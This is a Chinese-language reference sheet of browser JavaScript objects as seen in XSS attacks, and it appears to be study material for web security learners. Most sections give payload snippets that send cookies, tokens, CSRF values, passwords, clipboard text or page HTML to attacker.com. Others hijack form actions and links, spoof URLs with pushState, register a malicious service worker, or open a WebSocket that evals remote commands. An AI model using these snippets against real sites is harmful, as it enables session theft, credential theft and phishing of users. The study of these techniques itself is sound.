# JavaScript 内置对象速查 -- XSS 视角

> **目标：** 在阅读 XSS payload 或漏洞代码时，遇到 `document.xxx` 或 `window.xxx` 能立刻知道它在操作什么。

---

## 阅读约定

- `属性` -- 直接取值或赋值，没有括号。如 `document.cookie`
- `方法()` -- 需要括号调用。如 `document.querySelector('#main')`
- `[r]` -- 只读属性，攻击者不能修改它（但可以读取其中的敏感信息）
- `[rw]` -- 可读写属性，攻击者可以修改它来操控页面行为

---

## 1. window -- 浏览器窗口（全局对象）

`window` 是一切全局变量的根。在浏览器中，`alert(1)` 实际上是 `window.alert(1)`，但 `window.` 前缀通常被省略。

### 属性

| 属性 | 类型 | 说明 | XSS 中的样子 |
|------|------|------|-------------|
| `window.location` | Location 对象 [rw] | 当前页面的 URL 信息 | `window.location.href = 'https://attacker.com'` -- 重定向受害者 |
| `window.document` | Document 对象 [r] | 当前页面文档 | `window.document.cookie` -- 等价于 `document.cookie` |
| `window.name` | string [rw] | 窗口名称，跨域持久 | `window.name = 'payload'` 可跨页面传递数据 |
| `window.opener` | Window 对象 [r] | 打开当前窗口的父窗口 | `window.opener.location = 'https://attacker.com'` -- 钓鱼重定向 |
| `window.parent` | Window 对象 [r] | 父框架（iframe 中） | `window.parent.document.cookie` -- 读取父页面 cookie（同源才行） |
| `window.top` | Window 对象 [r] | 最顶层窗口 | `window.top.location` -- 获取顶层窗口 URL |
| `window.localStorage` | Storage 对象 [r] | 持久化本地存储 | `window.localStorage.getItem('token')` |
| `window.sessionStorage` | Storage 对象 [r] | 会话级本地存储 | `window.sessionStorage.getItem('token')` |
| `window.history` | History 对象 [r] | 浏览历史 | `window.history.pushState({}, '', '/login')` -- 伪装 URL |
| `window.navigator` | Navigator 对象 [r] | 浏览器信息 | `window.navigator.sendBeacon(url, data)` |
| `window.screen` | Screen 对象 [r] | 屏幕信息 | `window.screen.width` -- 获取屏幕宽度（指纹） |
| `window.innerWidth` | number [r] | 视口宽度 | 浏览器指纹的一部分 |
| `window.innerHeight` | number [r] | 视口高度 | 同上 |
| `window.onerror` | function [rw] | 全局错误处理器 | `window.onerror = alert; throw 1` -- 无括号调用 alert |

### 方法

| 方法 | 说明 | XSS 中的样子 |
|------|------|-------------|
| `window.alert(msg)` | 弹出警告框 | `alert(1)` -- 最经典的 XSS PoC |
| `window.confirm(msg)` | 弹出确认框（返回 true/false） | `confirm('Are you sure?')` -- 钓鱼确认 |
| `window.prompt(msg, default)` | 弹出输入框（返回输入值） | `prompt('Please enter your password')` -- 钓鱼输入 |
| `window.print()` | 触发打印对话框 | `print()` -- Chrome 92+ 跨源 iframe 中替代 alert 的 PoC |
| `window.open(url, name, features)` | 打开新窗口 | `window.open('https://attacker.com/?c=' + document.cookie)` -- 窃取数据 |
| `window.close()` | 关闭当前窗口 | 较少用于 XSS |
| `window.postMessage(data, origin)` | 跨窗口/iframe 发送消息 | `window.parent.postMessage('malicious', '*')` -- 向父窗口发送数据 |
| `window.setTimeout(fn, ms)` | 延迟执行函数 | `setTimeout('alert(1)', 1000)` -- 字符串参数会被当作代码执行 |
| `window.setInterval(fn, ms)` | 周期性执行函数 | `setInterval('alert(1)', 5000)` -- 同上 |
| `window.fetch(url, options)` | 发起 HTTP 请求 | `fetch('https://attacker.com/?c=' + document.cookie)` -- 窃取数据 |
| `window.btoa(str)` | Base64 编码 | `btoa('alert(1)')` → `"YWxlcnQoMSk="` |
| `window.atob(str)` | Base64 解码 | `atob('YWxlcnQoMSk=')` → `"alert(1)"` |

### XSS 常见模式

```
// 重定向钓鱼
window.location.href = 'https://attacker.com/phishing';

// 读取父窗口（同源 iframe 中）
var parentCookie = window.parent.document.cookie;

// 向父窗口发送消息（可能触发接收方的 XSS）
window.parent.postMessage('<img src=x onerror=alert(1)>', '*');

// 无括号 alert（通过 onerror + throw）
window.onerror = alert; throw 1;
```

---

## 2. document -- 当前网页文档

`document` 是 XSS 中使用频率最高的对象。它代表整个网页，攻击者通过它读取页面内容、修改 DOM、窃取数据。

### 属性

| 属性                         | 类型                 | 说明                          | XSS 中的样子                                                  |
| -------------------------- | ------------------ | --------------------------- | --------------------------------------------------------- |
| `document.cookie`          | string [rw]        | 当前页面的 Cookie（非 HttpOnly 部分） | `fetch('https://attacker.com/?c=' + document.cookie)`     |
| `document.body`            | HTMLElement [rw]   | `<body>` 元素                 | `document.body.innerHTML = '<h1>Hacked</h1>'` -- 替换整个页面内容 |
| `document.head`            | HTMLElement [r]    | `<head>` 元素                 | `document.head.querySelector('script')` -- 找到页面 script    |
| `document.documentElement` | HTMLElement [r]    | `<html>` 元素（整个文档的根）         | `document.documentElement.outerHTML` -- 获取整个页面 HTML       |
| `document.domain`          | string [r]         | 当前页面的域名                     | `alert(document.domain)` -- PoC 确认攻击在目标域执行                |
| `document.URL`             | string [r]         | 当前页面的完整 URL                 | `document.URL` -- 等价于 `location.href`                     |
| `document.referrer`        | string [r]         | 来源页面的 URL                   | 较少直接用于攻击，可作为 source                                       |
| `document.title`           | string [rw]        | 页面标题                        | `document.title = 'Hacked'` -- 修改标签页标题                    |
| `document.forms`           | HTMLCollection [r] | 页面中所有表单                     | `document.forms[0].action` -- 读取第一个表单的提交地址                |
| `document.images`          | HTMLCollection [r] | 页面中所有图片                     | `document.images.length` -- 页面图片数量                        |
| `document.scripts`         | HTMLCollection [r] | 页面中所有 script 标签             | `document.scripts[0].src` -- 第一个脚本的 src                   |
| `document.links`           | HTMLCollection [r] | 页面中所有链接                     | `document.links[0].href` -- 第一个链接的 URL                    |
| `document.hidden`          | boolean [r]        | 页面是否隐藏（用户切到其他标签页）           | 可用于判断是否被用户关注                                              |
| `document.baseURI`         | string [r]         | 文档的基础 URI                   | `document.baseURI` -- 获取基础 URL，可能用于构造相对路径                 |
| `document.characterSet`    | string [r]         | 文档的字符编码                     | `document.characterSet` -- 通常是 "UTF-8"                    |
| `document.contentType`     | string [r]         | 文档的 MIME 类型                 | `document.contentType` -- 通常是 "text/html"                 |

### 选择元素的方法

| 方法 | 说明 | XSS 中的样子 |
|------|------|-------------|
| `document.getElementById(id)` | 按 ID 查找单个元素 | `document.getElementById('csrf-token').value` |
| `document.getElementsByName(name)` | 按 name 属性查找（返回 NodeList） | `document.getElementsByName('csrf')[0].value` |
| `document.getElementsByTagName(tag)` | 按标签名查找（返回 HTMLCollection） | `document.getElementsByTagName('a')[0].href` |
| `document.getElementsByClassName(cls)` | 按 class 查找（返回 HTMLCollection） | `document.getElementsByClassName('token')[0].value` |
| `document.querySelector(selector)` | CSS 选择器，返回**第一个**匹配元素 | `document.querySelector('input[name="csrf"]').value` |
| `document.querySelectorAll(selector)` | CSS 选择器，返回**所有**匹配元素的 NodeList | `document.querySelectorAll('a').forEach(a => a.href = '//attacker.com')` |

**选择器速查：**

下面用这个 HTML 片段作为例子来演示每种选择器：

```html
<div id="main">
    <form class="login-form" action="/login" method="POST">
        <input name="csrf" type="hidden" value="abc123">
        <input name="username" type="text" placeholder="用户名">
        <input name="password" type="password" placeholder="密码">
        <button type="submit">登录</button>
    </form>
    <a href="/home">返回首页</a>
    <a href="javascript:void(0)">关于</a>
</div>
```

#### 基础选择器

| 选择器 | 含义 | 匹配结果 | 示例 |
|--------|------|---------|------|
| `#main` | 按 ID | 唯一元素 `id="main"` 的 div | `document.querySelector('#main')` |
| `.login-form` | 按 class | 所有 `class` 含 `login-form` 的元素 | `document.querySelector('.login-form')` |
| `input` | 按标签名 | 所有 `<input>` 元素（3 个） | `document.querySelectorAll('input')` |
| `*` | 通配符，匹配所有元素 | 所有元素 | 较少单独使用，常组合 `div > *` |

#### 属性选择器

| 选择器 | 含义 | 匹配结果 | 示例 |
|--------|------|---------|------|
| `[name]` | 有 `name` 属性的元素 | 所有带 name 的元素（3 个 input） | `document.querySelectorAll('[name]')` |
| `[name="csrf"]` | `name` 属性**等于** `"csrf"` | `<input name="csrf">` | `document.querySelector('[name="csrf"]')` |
| `[name^="user"]` | `name` 属性**以** `"user"` **开头** | `<input name="username">` | `document.querySelector('[name^="user"]')` |
| `[name$="word"]` | `name` 属性**以** `"word"` **结尾** | `<input name="password">` | `document.querySelector('[name$="word"]')` |
| `[name*="er"]` | `name` 属性**包含** `"er"` | `<input name="username">`, `<input name="password">` | `document.querySelectorAll('[name*="er"]')` |
| `[type="hidden"]` | `type` 属性等于 `"hidden"` | `<input name="csrf" type="hidden">` | `document.querySelector('[type="hidden"]')` |
| `[placeholder]` | 有 `placeholder` 属性的元素 | 用户名和密码输入框 | `document.querySelectorAll('[placeholder]')` |

#### 组合选择器

| 选择器 | 含义 | 匹配结果 | 示例 |
|--------|------|---------|------|
| `input[name]` | 标签为 `input` **且**有 `name` 属性 | 3 个 input | `document.querySelectorAll('input[name]')` |
| `input[type="password"]` | 标签为 `input` **且** `type="password"` | 密码输入框 | `document.querySelector('input[type="password"]')` |
| `form.login-form` | 标签为 `form` **且** class 为 `login-form` | 登录表单 | `document.querySelector('form.login-form')` |
| `input, button` | 所有 `input` **或** `button`（并集） | 3 个 input + 1 个 button | `document.querySelectorAll('input, button')` |

#### 层级选择器

| 选择器 | 含义 | 匹配结果 | 示例 |
|--------|------|---------|------|
| `#main form` | `#main` 内的**任意后代** `<form>` | 登录表单 | `document.querySelector('#main form')` |
| `#main > form` | `#main` 的**直接子元素** `<form>` | 登录表单（如果 form 是直接子元素） | `document.querySelector('#main > form')` |
| `form input` | `<form>` 内的任意后代 `<input>` | 3 个 input | `document.querySelectorAll('form input')` |
| `form > input` | `<form>` 的直接子元素 `<input>` | 3 个 input（示例中 form 直接包含 input） | `document.querySelectorAll('form > input')` |

**`>` 和空格的区分很重要：**

```html
<div id="outer">
    <div id="inner">
        <p>内容</p>
    </div>
</div>
```

```
#outer p      → 匹配 <p>（p 是 outer 的任意后代，隔了几层都行）
#outer > p    → 不匹配任何元素（p 不是 outer 的直接子元素，中间隔着 #inner）
#outer > div > p → 匹配 <p>（精确指定层级关系）
```

#### 伪选择器与序数选择

| 选择器 | 含义 | 示例 |
|--------|------|------|
| `input:first-child` | 是其父元素的**第一个子元素**的 input | `document.querySelector('input:first-child')` |
| `input:last-child` | 是其父元素的**最后一个子元素**的 input | `document.querySelector('input:last-child')` |
| `input:nth-child(2)` | 是其父元素的**第 2 个子元素**的 input | `document.querySelector('input:nth-child(2)')` |
| `input:first-of-type` | 同类标签中的**第一个** `<input>` | `document.querySelector('input:first-of-type')` |
| `a:first-of-type` | 同类标签中的第一个 `<a>` | `document.querySelector('a:first-of-type')` → 返回首页 |
| `a:last-of-type` | 同类标签中的最后一个 `<a>` | `document.querySelector('a:last-of-type')` → 关于 |

`nth-child` 和 `nth-of-type` 的区别：

```html
<div>
    <p>A</p>          <!-- div 的第 1 个子元素 -->
    <a href="/1">1</a>  <!-- div 的第 2 个子元素 -->
    <a href="/2">2</a>  <!-- div 的第 3 个子元素 -->
</div>
```

```
a:first-child       → 不匹配（div 的第一个子元素是 p，不是 a）
a:nth-child(2)      → 匹配 <a href="/1">（div 的第 2 个子元素，恰好是 a）
a:first-of-type     → 匹配 <a href="/1">（第一个 a 标签，不管前面有没有 p）
```

#### XSS 中最常用的选择器组合

```
// 按 name 属性读取表单字段值（最常用）
document.querySelector('input[name="csrf"]').value
document.querySelector('input[name="username"]').value
document.querySelector('input[type="password"]').value

// 读取 meta 标签的 content 属性（常用于 CSRF token）
document.querySelector('meta[name="csrf-token"]').getAttribute('content')

// 批量操作：修改所有链接
document.querySelectorAll('a[href]').forEach(a => a.href = 'https://attacker.com')

// 找到登录表单并修改提交地址
document.querySelector('form[action*="login"]').action = 'https://attacker.com/steal'

// 检查页面上是否有某元素
if (document.querySelector('input[name="csrf"]')) {
    // 有 CSRF 保护，需要绕过
}
```

### DOM 操作方法

| 方法 | 说明 | XSS 中的样子 |
|------|------|-------------|
| `document.createElement(tag)` | 创建新元素（不插入 DOM） | `var div = document.createElement('div')` |
| `document.createTextNode(text)` | 创建文本节点（安全，不解析 HTML） | `var text = document.createTextNode(userInput)` |
| `document.createDocumentFragment()` | 创建文档片段 | 批量插入元素时使用 |
| `document.write(html)` | 向文档写入 HTML **[危险 sink]** | `document.write('<img src=x onerror=alert(1)>')` |
| `document.writeln(html)` | 同 write，末尾加换行 **[危险 sink]** | `document.writeln(userInput)` |

### XSS 常见模式

```
// 读取 CSRF token（三种写法等价）
document.querySelector('input[name="csrf"]').value
document.getElementsByName('csrf')[0].value
document.querySelector('meta[name="csrf-token"]').getAttribute('content')

// 窃取整个页面内容
fetch('https://attacker.com/', {
    method: 'POST',
    body: document.documentElement.outerHTML
});

// 修改页面所有链接指向钓鱼站
document.querySelectorAll('a').forEach(function(a) {
    a.href = 'https://attacker.com/';
});

// 创建伪造登录表单
var form = document.createElement('form');
form.innerHTML = '<input name="user"><input name="pass" type="password">';
document.body.appendChild(form);

// 用 textContent 防御 XSS（安全替代 innerHTML）
document.getElementById('output').textContent = userInput;  // 纯文本，不解析 HTML
```

---

## 3. Element -- 单个 HTML 元素

当你通过 `document.querySelector()` 等方法获取到的是一个 **Element 对象**。以下属性和方法适用于任何 HTML 元素。

### 属性

| 属性 | 类型 | 说明 | XSS 中的样子 |
|------|------|------|-------------|
| `element.innerHTML` | string [rw] | 元素的 HTML 内容 **[危险 sink]** | `div.innerHTML = '<img src=x onerror=alert(1)>'` |
| `element.outerHTML` | string [rw] | 元素自身的完整 HTML **[危险 sink]** | `div.outerHTML = '<img src=x onerror=alert(1)>'` |
| `element.textContent` | string [rw] | 元素的纯文本内容 **[安全]** | `div.textContent = userInput` -- 不解析 HTML |
| `element.innerText` | string [rw] | 元素的可见文本 **[安全]** | `div.innerText = userInput` -- 类似 textContent，考虑 CSS |
| `element.value` | string [rw] | 表单元素的值（input, textarea, select） | `input.value` -- 读取/写入输入框内容 |
| `element.tagName` | string [r] | 元素的标签名（大写） | `element.tagName` → `"DIV"`, `"INPUT"` |
| `element.id` | string [rw] | 元素的 ID | `element.id = 'newId'` |
| `element.className` | string [rw] | 元素的 class（字符串） | `element.className = 'hidden'` |
| `element.classList` | DOMTokenList [rw] | 元素的 class 列表（可增删） | `element.classList.add('hidden')` |
| `element.src` | string [rw] | 图片/脚本/iframe 的源 URL | `img.src = 'https://attacker.com/?c=' + document.cookie` |
| `element.href` | string [rw] | 链接的目标 URL | `a.href = 'javascript:alert(1)'` -- `javascript:` 伪协议 |
| `element.action` | string [rw] | 表单的提交地址 | `form.action = 'https://attacker.com/steal'` |
| `element.hidden` | boolean [rw] | 元素是否隐藏 | `element.hidden = true` -- 隐藏元素 |
| `element.style` | CSSStyleDeclaration [rw] | 元素的内联样式 | `element.style.display = 'none'` -- 隐藏元素 |
| `element.attributes` | NamedNodeMap [r] | 元素的所有属性集合 | `element.attributes['href'].value` |
| `element.parentElement` | Element [r] | 父元素 | `element.parentElement.innerHTML` -- 读取父元素内容 |
| `element.children` | HTMLCollection [r] | 子元素集合 | `element.children[0].value` -- 第一个子元素的值 |
| `element.firstChild` | Node [r] | 第一个子节点（可能是文本节点） | |
| `element.lastChild` | Node [r] | 最后一个子节点 | |
| `element.nextSibling` | Node [r] | 下一个兄弟节点 | |
| `element.previousSibling` | Node [r] | 上一个兄弟节点 | |
| `element.nextElementSibling` | Element [r] | 下一个兄弟元素 | 跳过文本节点 |
| `element.previousElementSibling` | Element [r] | 上一个兄弟元素 | 跳过文本节点 |

### 方法

| 方法 | 说明 | XSS 中的样子 |
|------|------|-------------|
| `element.getAttribute(name)` | 获取属性值 | `el.getAttribute('href')` → 得到 href 的原始值 |
| `element.setAttribute(name, value)` | 设置属性值 | `el.setAttribute('href', 'javascript:alert(1)')` |
| `element.removeAttribute(name)` | 删除属性 | `el.removeAttribute('disabled')` |
| `element.hasAttribute(name)` | 检查是否有某属性 | `el.hasAttribute('href')` → true/false |
| `element.appendChild(child)` | 追加子元素 | `document.body.appendChild(img)` |
| `element.removeChild(child)` | 移除子元素 | `el.removeChild(el.children[0])` |
| `element.insertBefore(new, ref)` | 在参考元素前插入 | `el.insertBefore(img, el.firstChild)` |
| `element.replaceChild(new, old)` | 替换子元素 | |
| `element.cloneNode(deep)` | 克隆元素 | `el.cloneNode(true)` -- 深克隆（包含子元素） |
| `element.insertAdjacentHTML(pos, html)` | 在指定位置插入 HTML **[危险 sink]** | `el.insertAdjacentHTML('beforeend', '<img src=x onerror=alert(1)>')` |
| `element.addEventListener(event, fn)` | 绑定事件监听 | `el.addEventListener('click', function(){alert(1)})` |
| `element.removeEventListener(event, fn)` | 移除事件监听 | |
| `element.click()` | 模拟点击 | `el.click()` -- 程序化触发点击事件 |
| `element.focus()` | 使元素获得焦点 | `el.focus()` -- 配合 autofocus 自动触发 onfocus |
| `element.blur()` | 使元素失去焦点 | |
| `element.scrollIntoView()` | 滚动到元素可见位置 | 钓鱼页面中滚动到伪造表单 |
| `element.matches(selector)` | 检查元素是否匹配选择器 | `el.matches('.highlight')` → true/false |
| `element.closest(selector)` | 向上查找最近的匹配祖先元素 | `el.closest('form')` -- 找到包含此元素的表单 |

### insertAdjacentHTML 的 position 参数

```
'beforebegin'  -- 元素之前
'afterbegin'   -- 第一个子元素之前（元素内部开头）
'beforeend'    -- 最后一个子元素之后（元素内部末尾）【最常用】
'afterend'     -- 元素之后
```

```
<!-- beforebegin -->
<div>
  <!-- afterbegin -->
  现有内容
  <!-- beforeend -->
</div>
<!-- afterend -->
```

### XSS 常见模式

```
// 修改链接（三种写法等价）
link.href = 'javascript:alert(1)';
link.setAttribute('href', 'javascript:alert(1)');
link['href'] = 'javascript:alert(1)';

// 读取表单字段
var username = document.querySelector('input[name="username"]').value;
var password = document.querySelector('input[type="password"]').value;

// 创建并插入恶意元素
var img = document.createElement('img');
img.src = 'x';
img.onerror = function() { alert(1); };
document.body.appendChild(img);

// 或者一步到位用 insertAdjacentHTML
document.body.insertAdjacentHTML('beforeend', '<img src=x onerror=alert(1)>');

// 隐藏原始内容，显示钓鱼内容
document.querySelector('.real-content').style.display = 'none';
document.querySelector('.fake-login').style.display = 'block';

// 窃取自动填充的密码
var pw = document.querySelector('input[type="password"]').value;
new Image().src = 'https://attacker.com/?pw=' + encodeURIComponent(pw);
```

---

## 4. location -- 当前页面 URL

`window.location`（或直接写 `location`）既是对象也是字符串。XSS 中它既是 source（攻击者通过 URL 传入 payload），也是 sink（通过 `javascript:` 协议执行代码）。

### 属性

| 属性 | 说明 | 示例（URL：`https://site.com:8080/page?q=xss#top`） |
|------|------|---------------------------------------------------|
| `location.href` | 完整 URL 字符串 | `"https://site.com:8080/page?q=xss#top"` |
| `location.origin` | 协议 + 主机 + 端口 | `"https://site.com:8080"` |
| `location.protocol` | 协议（含冒号） | `"https:"` |
| `location.host` | 主机 + 端口 | `"site.com:8080"` |
| `location.hostname` | 主机名 | `"site.com"` |
| `location.port` | 端口号 | `"8080"` |
| `location.pathname` | 路径 | `"/page"` |
| `location.search` | 查询字符串（含 `?`） | `"?q=xss"` |
| `location.hash` | 片段标识符（含 `#`） | `"#top"` |

### XSS 中 Source 与 Sink

**作为 Source（攻击入口）：**

```
// 以下全是攻击者可以控制的输入点
location.href        // 完整 URL
location.search      // ? 后面的查询参数，如 ?q=<script>alert(1)</script>
location.hash        // # 后面的片段，如 #<img src=x onerror=alert(1)>
location.pathname    // 路径部分（某些框架从路径取参数）

// 常见用法：提取 URL 参数
var query = new URLSearchParams(location.search).get('q');
var hashValue = location.hash.slice(1);  // 去掉开头的 #
```

**作为 Sink（危险输出）：**

```
// 以下操作如果参数可控，会导致代码执行或重定向
location.href = userInput;          // 如果 userInput 是 'javascript:alert(1)'
location.replace(userInput);        // 同上
location.assign(userInput);         // 同上
location = userInput;               // 同上（location 对象可直接赋值）
```

### XSS 常见模式

```
// 从 URL 读取参数（Source）
var searchTerm = new URLSearchParams(location.search).get('search');
document.getElementById('output').innerHTML = searchTerm;  // Sink

// 用 eval 执行 hash 中的代码（经典 Source → Sink）
eval(location.hash.slice(1));
// URL: https://site.com/page#alert(document.cookie)

// 将 location.hash 的值传给 jQuery $()（Source → Sink）
$(location.hash.slice(1));
// URL: https://site.com/page#<img src=x onerror=alert(1)>

// 重定向攻击（Sink）
location.href = 'https://attacker.com/phishing?from=' + location.href;
```

---

## 5. URLSearchParams -- 解析 URL 参数

`URLSearchParams` 是专门用于解析 `?key=value&key2=value2` 格式查询字符串的工具。

### 基本用法

```
// 从当前 URL 解析
var params = new URLSearchParams(location.search);

// 或从任意字符串解析
var params = new URLSearchParams('q=xss&page=1&debug=true');
```

### 方法

| 方法 | 说明 | 示例 |
|------|------|------|
| `params.get(name)` | 获取指定参数的**第一个**值 | `params.get('q')` → `"xss"` |
| `params.getAll(name)` | 获取指定参数的**所有**值（数组） | `params.getAll('q')` → `["xss"]` |
| `params.has(name)` | 检查参数是否存在 | `params.has('debug')` → `true` |
| `params.toString()` | 转回查询字符串 | `params.toString()` → `"q=xss&page=1"` |
| `params.set(name, value)` | 设置参数值（覆盖已有的） | `params.set('q', 'new')` |
| `params.append(name, value)` | 追加参数值（不覆盖） | `params.append('q', 'value2')` |
| `params.delete(name)` | 删除参数 | `params.delete('debug')` |

### XSS 常见模式

```
// 最经典：从 URL 取参数 → 写入 innerHTML（DOM XSS）
var query = (new URLSearchParams(location.search)).get('search');
document.getElementById('results').innerHTML = query;

// 取参数 → 设置链接 href（jQuery attr XSS）
var returnUrl = (new URLSearchParams(location.search)).get('returnPath');
$('#backLink').attr('href', returnUrl);
// 攻击：?returnPath=javascript:alert(document.cookie)
```

---

## 6. navigator -- 浏览器信息

`navigator` 对象提供浏览器和环境信息。XSS 中最常用的是 `sendBeacon()`。

### 属性

| 属性 | 说明 | XSS 中的样子 |
|------|------|-------------|
| `navigator.userAgent` | 浏览器 UA 字符串 | 指纹收集的一部分 |
| `navigator.cookieEnabled` | 是否启用 Cookie | `navigator.cookieEnabled` → true/false |
| `navigator.onLine` | 是否联网 | `navigator.onLine` → true/false |
| `navigator.language` | 浏览器语言 | `navigator.language` → `"zh-CN"` |
| `navigator.platform` | 操作系统平台 | `navigator.platform` → `"Win32"` |
| `navigator.serviceWorker` | Service Worker 容器 | `navigator.serviceWorker.register('/sw.js')` -- 注册恶意 SW |
| `navigator.clipboard` | 剪贴板 API | `navigator.clipboard.readText()` -- 读取剪贴板 |
| `navigator.geolocation` | 地理位置 API | `navigator.geolocation.getCurrentPosition(...)` |

### 方法

| 方法 | 说明 | XSS 中的样子 |
|------|------|-------------|
| `navigator.sendBeacon(url, data)` | 发送 POST 请求，即使页面关闭也会完成 | `navigator.sendBeacon('https://attacker.com/', document.cookie)` |

### sendBeacon 为什么适合数据窃取

```
// fetch：页面关闭时请求可能被取消
fetch('https://attacker.com/', {method: 'POST', body: data});

// sendBeacon：页面关闭时请求保证完成
navigator.sendBeacon('https://attacker.com/', data);

// sendBeacon 限制：
// 1. 只能 POST
// 2. 无法自定义请求头
// 3. 无法读取响应
// 4. 数据量有限（通常 64KB）
```

### XSS 常见模式

```
// 最隐蔽的数据窃取
navigator.sendBeacon('https://attacker.com/steal', document.cookie);

// 读取剪贴板
navigator.clipboard.readText().then(function(text) {
    fetch('https://attacker.com/?c=' + encodeURIComponent(text));
});

// 注册恶意 Service Worker（持久化攻击）
navigator.serviceWorker.register('https://attacker.com/sw.js');
```

---

## 7. history -- 浏览历史

### 方法

| 方法 | 说明 | XSS 中的样子 |
|------|------|-------------|
| `history.pushState(state, title, url)` | 添加历史记录，修改地址栏 URL（不刷新页面） | `history.pushState({}, '', '/login')` -- URL 看起来像登录页 |
| `history.replaceState(state, title, url)` | 替换当前历史记录，修改地址栏 URL | `history.replaceState({}, '', '/dashboard')` -- 伪装 URL |
| `history.back()` | 后退一页 | |
| `history.forward()` | 前进一页 | |
| `history.go(n)` | 前进/后退 n 页 | `history.go(-2)` -- 后退两页 |

### XSS 常见模式

```
// 钓鱼：修改 URL 让受害者以为自己在一个合法页面
history.pushState({}, '', '/login');

// 劫持后退按钮
history.pushState({}, '', location.href);  // 复制当前 URL
window.onpopstate = function() {
    // 用户按后退时触发，可以阻止离开或再次 push
    history.pushState({}, '', location.href);
};
```

---

## 8. localStorage / sessionStorage -- 浏览器存储

两者 API 完全相同。区别在于生命周期和共享范围：

| 特性 | localStorage | sessionStorage |
|------|-------------|---------------|
| 持久性 | 永久（除非手动删除） | 标签页关闭后清除 |
| 共享范围 | 同源所有标签页共享 | 仅当前标签页 |
| 容量 | 通常 5-10MB | 通常 5-10MB |

### 方法

| 方法 | 说明 | XSS 中的样子 |
|------|------|-------------|
| `storage.setItem(key, value)` | 存储数据 | `localStorage.setItem('malware', payload)` |
| `storage.getItem(key)` | 读取数据 | `localStorage.getItem('access_token')` |
| `storage.removeItem(key)` | 删除数据 | `localStorage.removeItem('access_token')` |
| `storage.clear()` | 清空所有数据 | `localStorage.clear()` |
| `storage.key(n)` | 获取第 n 个键名 | `localStorage.key(0)` |
| `storage.length` | 键的数量 | `localStorage.length` |

### XSS 常见模式

```
// 窃取存储中的 token
var token = localStorage.getItem('access_token');
if (token) {
    fetch('https://attacker.com/?token=' + encodeURIComponent(token));
}

// 持久化恶意脚本（存储型 XSS 的另一种形式）
localStorage.setItem('evil', '<img src=x onerror=alert(1)>');
document.body.innerHTML = localStorage.getItem('evil');
```

---

## 9. fetch API -- 发起 HTTP 请求

`fetch()` 是现代浏览器发起 HTTP 请求的标准方式。它是 XSS 数据窃取的核心工具。

### 基本语法

```
fetch(url, options)
```

### options 常用字段

| 字段 | 说明 | 示例 |
|------|------|------|
| `method` | HTTP 方法 | `'GET'`, `'POST'`, `'PUT'`, `'DELETE'` |
| `headers` | 请求头对象 | `{'Content-Type': 'application/x-www-form-urlencoded'}` |
| `body` | 请求体（GET 请求不需要） | `'email=attacker@evil.com'` |
| `credentials` | 是否携带 Cookie | `'include'` -- 携带（同源和跨源都带） |
| `mode` | CORS 模式 | `'cors'`, `'no-cors'`, `'same-origin'` |

### fetch 返回的是 Promise

你需要 `.then()` 来处理响应：

```
fetch('/api/data', {credentials: 'include'})   // 发起请求（携带 cookie）
    .then(function(response) {                   // 等响应回来
        return response.text();                  // 提取响应为文本
    })
    .then(function(data) {                       // 等文本提取完成
        console.log(data);                       // 处理数据
    });
```

### XSS 常见模式

```
// GET 请求窃取 CSRF token
fetch('/admin/profile', {credentials: 'include'})
    .then(r => r.text())
    .then(html => {
        // 从响应 HTML 中提取 CSRF token
        var parser = new DOMParser();
        var doc = parser.parseFromString(html, 'text/html');
        var token = doc.querySelector('input[name="csrf"]').value;
        fetch('https://attacker.com/?token=' + token);
    });

// POST 请求执行操作（如修改邮箱）
fetch('/account/change-email', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'email=attacker@evil.com'
});

// 无 CORS 限制的使用 Image 对象（仅 GET）
new Image().src = 'https://attacker.com/?c=' + encodeURIComponent(document.cookie);
```

---

## 10. XMLHttpRequest -- 旧版 HTTP 请求

现代代码优先使用 `fetch()`，但老代码和某些 payload 中仍会出现 `XMLHttpRequest`。

### 基本模式

```
var xhr = new XMLHttpRequest();
xhr.open('GET', '/api/data', true);        // 方法, URL, 异步?
xhr.withCredentials = true;                // 携带 Cookie
xhr.onreadystatechange = function() {      // 状态变化时的回调
    if (xhr.readyState === 4) {            // 4 = 请求完成
        if (xhr.status === 200) {          // 200 = 成功
            var data = xhr.responseText;   // 获取响应文本
            // 处理 data...
        }
    }
};
xhr.send();                                // 发送请求
```

### readyState 状态码

| 值 | 含义 |
|----|------|
| 0 | 未初始化 |
| 1 | 已调用 open() |
| 2 | 已发送请求，收到响应头 |
| 3 | 正在接收响应体 |
| 4 | 完成 |

### XSS 常见模式

```
// POST 修改邮箱（兼容旧浏览器）
var xhr = new XMLHttpRequest();
xhr.open('POST', '/account/change-email', true);
xhr.withCredentials = true;
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('email=attacker@evil.com');

// GET 窃取页面并外传
var xhr = new XMLHttpRequest();
xhr.open('GET', '/admin/users', true);
xhr.withCredentials = true;
xhr.onreadystatechange = function() {
    if (xhr.readyState === 4) {
        fetch('https://attacker.com/', {method: 'POST', body: xhr.responseText});
    }
};
xhr.send();
```

---

## 11. WebSocket -- 全双工通信

WebSocket 建立持久连接，可用于实时窃取数据或接收攻击者指令。

```
var ws = new WebSocket('wss://attacker.com/');
ws.onopen = function() {
    ws.send('Client connected: ' + document.cookie);
};
ws.onmessage = function(event) {
    // 执行攻击者发来的命令
    eval(event.data);
};
```

---

## 12. Image 对象 -- 无需插入 DOM 即可发请求

`new Image()` 创建的图片对象不需要被插入到页面 DOM 中，浏览器就会发起 HTTP 请求加载 `src`。这是绕过 CORS 的经典数据窃取方式。

```
var img = new Image();
img.src = 'https://attacker.com/steal?data=' + encodeURIComponent(document.cookie);
// 完了。浏览器已经开始加载这个"图片"了，cookie 已经发出去了。
```

**优点：**
- 不需要 CORS 头（浏览器加载图片不受同源策略限制）
- 不需要插入 DOM
- 代码极短

**限制：**
- 只能 GET 请求
- URL 长度有限（通常约 2000 字符）

---

## 13. console -- 控制台

`console.log()` 在开发中用于调试输出，在 XSS 中主要用于**自我验证**（确认代码已执行到某个位置）。

```
console.log('XSS triggered');
console.log(document.cookie);  // 在 Console 面板输出 cookie（不弹窗，更隐蔽）
```

---

## 快速索引（按 XSS 攻击目标查找）

| 你想做什么 | 用这个 |
|-----------|--------|
| 窃取 Cookie | `document.cookie` + `fetch()` 或 `new Image().src` |
| 窃取 CSRF Token | `document.querySelector('input[name="csrf"]').value` |
| 窃取页面内容 | `document.documentElement.outerHTML` |
| 窃取 localStorage token | `localStorage.getItem('access_token')` |
| 读取剪贴板 | `navigator.clipboard.readText()` |
